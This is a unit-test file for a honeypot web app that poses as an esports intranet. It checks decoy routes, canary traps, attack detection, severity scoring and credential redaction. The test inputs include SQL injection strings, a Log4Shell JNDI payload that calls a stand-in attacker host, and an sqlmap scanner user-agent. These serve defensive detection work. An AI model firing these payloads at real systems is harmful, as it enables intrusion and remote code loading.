/**
 * VIGILANCE Nowhere Esports Intranet - Decoy Routes & Middleware Unit Tests
 * Runs against MockEvidenceRepository without requiring a live MongoDB instance.
 */

import { describe, it, expect, beforeEach } from 'vitest';
import request from 'supertest';
import { createApp } from '../../src/app.js';
import { MockEvidenceRepository } from '../../src/repository/mockEvidenceRepository.js';

describe('Decoy Routes & Detection Middleware (Unit Tests)', () => {
  let mockRepo: MockEvidenceRepository;
  let app: ReturnType<typeof createApp>;

  beforeEach(() => {
    mockRepo = new MockEvidenceRepository();
    app = createApp({
      evidenceRepository: mockRepo,
    });
  });

  describe('1. Benign Traffic (Zero False Positives)', () => {
    it('serves homepage with HTTP 200 and generates zero attack records', async () => {
      const res = await request(app).get('/');
      expect(res.status).toBe(200);
      expect(res.text).toContain('Nowhere Esports Intranet');
      expect(mockRepo.getAllRecords().length).toBe(0);
    });

    it('serves tournaments listing with HTTP 200 and generates zero attack records', async () => {
      const res = await request(app).get('/tournaments');
      expect(res.status).toBe(200);
      expect(res.text).toContain('Official Tournaments');
      expect(mockRepo.getAllRecords().length).toBe(0);
    });

    it('serves staff directory with HTTP 200 and generates zero attack records', async () => {
      const res = await request(app).get('/staff/directory');
      expect(res.status).toBe(200);
      expect(res.text).toContain('Staff & Production Directory');
      expect(mockRepo.getAllRecords().length).toBe(0);
    });

    it('returns mock tournament JSON API with HTTP 200', async () => {
      const res = await request(app).get('/api/v1/tournaments');
      expect(res.status).toBe(200);
      expect(res.body.status).toBe('success');
      expect(Array.isArray(res.body.data)).toBe(true);
      expect(mockRepo.getAllRecords().length).toBe(0);
    });

    it('returns single tournament detail with HTTP 200', async () => {
      const res = await request(app).get('/api/v1/tournaments/trn-apex-2026-s1');
      expect(res.status).toBe(200);
      expect(res.body.data.game).toBe('Apex Legends');
    });

    it('returns mock staff JSON API with HTTP 200', async () => {
      const res = await request(app).get('/api/v1/staff');
      expect(res.status).toBe(200);
      expect(res.body.status).toBe('success');
      expect(Array.isArray(res.body.data)).toBe(true);
    });
  });

  describe('2. Decoy Traps & Canary Routes', () => {
    it('serves robots.txt with HTTP 200 containing honeypot disallow directives', async () => {
      const res = await request(app).get('/robots.txt');
      expect(res.status).toBe(200);
      expect(res.text).toContain('Disallow: /admin/');
      expect(res.text).toContain('Disallow: /.env');
      expect(res.text).toContain('Disallow: /backup/');
    });

    it('rejects player login attempts with HTTP 401 without authenticating', async () => {
      const res = await request(app)
        .post('/login')
        .type('form')
        .send({ username: 'pro_player_99', password: 'password123' });

      expect(res.status).toBe(401);
      expect(res.text).toContain('Authentication failed');
    });

    it('serves decoy administrative login page with HTTP 200', async () => {
      const res = await request(app).get('/admin/login');
      expect(res.status).toBe(200);
      expect(res.text).toContain('Administrative Console');
    });

    it('rejects administrative login attempts with HTTP 401', async () => {
      const res = await request(app)
        .post('/admin/login')
        .type('form')
        .send({ username: 'root', password: 'HardwareToken1234' });

      expect(res.status).toBe(401);
      expect(res.text).toContain('Administrative verification rejected');
    });

    it('blocks access to restricted staff dashboard with HTTP 403', async () => {
      const res = await request(app).get('/staff/dashboard');
      expect(res.status).toBe(403);
      expect(res.text).toContain('Staff Portal Access Denied');
    });

    it('traps access to /.env with HTTP 403 and records canary reconnaissance probe', async () => {
      const res = await request(app).get('/.env');
      expect(res.status).toBe(403);

      const records = mockRepo.getAllRecords();
      expect(records.length).toBe(1);
      expect(records[0].detection.matched_signatures.some(s => s.category === 'RECONNAISSANCE')).toBe(true);
      expect(records[0].detection.applied_modifiers).toContain('CANARY_ROUTE_PROBE (+15)');
    });
  });

  describe('3. Synthetic Exploit Capture & Severity Scoring', () => {
    it('intercepts SQL injection probe on tournaments API and persists evidence', async () => {
      const res = await request(app).get("/api/v1/tournaments?region=EU' OR '1'='1");
      expect(res.status).toBe(200); // Decoy still responds normally!

      const records = mockRepo.getAllRecords();
      expect(records.length).toBe(1);
      const record = records[0];

      expect(record.event_id).toBeDefined();
      expect(record.publish_status).toBe('PENDING');
      expect(record.detection.matched_signatures.some(s => s.category === 'SQL_INJECTION')).toBe(true);
      expect(record.detection.severity_score).toBe(35);
      expect(record.detection.severity_level).toBe('LOW');
    });

    it('intercepts Log4Shell JNDI injection in User-Agent header', async () => {
      const res = await request(app)
        .get('/api/v1/staff')
        .set('User-Agent', '${jndi:ldap://evil-recon.attacker.com/exploit}');

      expect(res.status).toBe(200);
      const records = mockRepo.getAllRecords();
      expect(records.length).toBe(1);
      expect(records[0].detection.matched_signatures.some(s => s.category === 'LOG4SHELL')).toBe(true);
      expect(records[0].detection.severity_level).toBe('MEDIUM');
    });

    it('intercepts multi-vector exploit with scanner user-agent and clamps to 100 CRITICAL', async () => {
      const res = await request(app)
        .get("/.env?query=1 UNION SELECT null, username, password FROM users--")
        .set('User-Agent', 'sqlmap/1.7.2#stable');

      expect(res.status).toBe(403);
      const records = mockRepo.getAllRecords();
      expect(records.length).toBe(1);
      const record = records[0];

      expect(record.detection.severity_score).toBe(100); // Clamped from 130
      expect(record.detection.severity_level).toBe('CRITICAL');
      expect(record.detection.applied_modifiers).toContain('CANARY_ROUTE_PROBE (+15)');
      expect(record.detection.applied_modifiers).toContain('SCANNER_USER_AGENT (+15)');
      expect(record.detection.applied_modifiers).toContain('MULTI_VECTOR_COMBINATION (+20)');
    });

    it('redacts sensitive passwords and authorization tokens before evidence storage', async () => {
      await request(app)
        .post('/login')
        .set('Authorization', 'Bearer super-secret-jwt-token-9988')
        .set('Cookie', 'session=admin-auth-cookie-secret')
        .type('form')
        .send({
          username: "admin' OR 1=1--",
          password: 'SuperSecretAttackerPassword123!',
        });

      const records = mockRepo.getAllRecords();
      expect(records.length).toBe(1);
      const record = records[0];

      // Verify headers were redacted
      expect(record.request.headers['authorization']).toBe('[REDACTED_SECRET]');
      expect(record.request.headers['cookie']).toBe('[REDACTED_COOKIE]');
      expect(JSON.stringify(record.request.headers)).not.toContain('super-secret-jwt-token-9988');

      // Verify body credentials were redacted
      expect(record.request.body_raw).toContain('[REDACTED_SECRET]');
      expect(record.request.body_raw).not.toContain('SuperSecretAttackerPassword123!');
    });

    it('rejects oversized request bodies exceeding 4096 bytes with HTTP 413', async () => {
      const oversizedPayload = 'A'.repeat(5000);
      const res = await request(app)
        .post('/api/v1/tournaments')
        .set('Content-Type', 'text/plain')
        .send(oversizedPayload);

      expect(res.status).toBe(413);
      expect(res.body.error).toBe('Payload Too Large');
    });
  });
});
